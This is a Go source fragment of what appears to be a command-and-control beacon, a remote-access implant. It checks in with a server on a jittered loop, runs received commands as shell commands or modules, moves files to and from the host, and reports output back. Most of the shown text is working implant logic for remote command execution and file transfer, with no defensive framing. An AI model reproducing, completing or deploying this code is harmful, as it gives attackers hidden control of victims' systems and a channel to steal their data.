// Check-in and command processing methods

func (b *GoBeacon) requestAction() (string, error) {
	message := fmt.Sprintf("request_action|%s", b.AgentID)
	return b.sendTCP(message, true)
}

func (b *GoBeacon) sendCommandOutput(output string) error {
	message := fmt.Sprintf("command_output|%s|%s", b.AgentID, output)
	_, err := b.sendTCP(message, false)
	return err
}

func (b *GoBeacon) processCommand(commandData string) {
	if commandData == "" || commandData == "No commands queued" || commandData == "no_pending_commands" {
		return
	}

	b.Logger.Printf("Processing command: %s", commandData)

	var output string

	if strings.HasPrefix(commandData, "execute_command|") {
		parts := strings.SplitN(commandData, "|", 2)
		if len(parts) >= 2 {
			command := parts[1]
			// Check for beacon shutdown command
			if command == "shutdown" {
				b.Logger.Println("Received shutdown command, stopping beacon...")
				b.IsRunning = false
				output = "Beacon shutting down"
			} else {
				output = b.executeCommand(command)
			}
		}
	} else if strings.HasPrefix(commandData, "execute_module|") {
		parts := strings.SplitN(commandData, "|", 3)
		if len(parts) >= 2 {
			module := parts[1]
			parameters := ""
			if len(parts) >= 3 {
				parameters = parts[2]
			}
			output = b.executeModule(module, parameters)
		}
	} else if strings.HasPrefix(commandData, "to_beacon|") {
		parts := strings.SplitN(commandData, "|", 2)
		if len(parts) >= 2 {
			output = b.downloadFile(parts[1])
		}
	} else if strings.HasPrefix(commandData, "from_beacon|") {
		parts := strings.SplitN(commandData, "|", 2)
		if len(parts) >= 2 {
			output = b.uploadFile(parts[1])
		}
	} else if commandData == "shutdown" {
		// Beacon shutdown command - stop the beacon loop
		b.Logger.Println("Received shutdown command, stopping beacon...")
		b.IsRunning = false
		output = "Beacon shutting down"
	} else {
		// Default: treat as shell command
		output = b.executeCommand(commandData)
	}

	if err := b.sendCommandOutput(output); err != nil {
		b.Logger.Printf("Error sending command output: %v", err)
	}
}

func (b *GoBeacon) Run() {
	b.Logger.Println("Starting Go beacon...")

	if err := b.register(); err != nil {
		b.Logger.Printf("Registration failed: %v", err)
		return
	}

	b.IsRunning = true
	b.Logger.Println("Registration successful, starting check-in loop...")

	for b.IsRunning {
		b.Logger.Printf("Checking in with server...")
		action, err := b.requestAction()
		if err != nil {
			b.Logger.Printf("Error requesting action: %v", err)
			time.Sleep(5 * time.Second)
			continue
		}

		if action == "" || action == "No commands queued" || action == "no_pending_commands" {
			b.Logger.Printf("No pending commands")
		} else if strings.HasPrefix(action, "ERROR") {
			b.Logger.Printf("Server returned error: %s", action)
		} else {
			b.Logger.Printf("Received command: %s", action)
			b.processCommand(action)
		}

		jitter := time.Duration(rand.Intn(5000)) * time.Millisecond
		sleepTime := b.CheckInterval + jitter
		b.Logger.Printf("Sleeping for %v before next check-in...", sleepTime)
		time.Sleep(sleepTime)
	}

	b.Logger.Println("Beacon stopped")
}
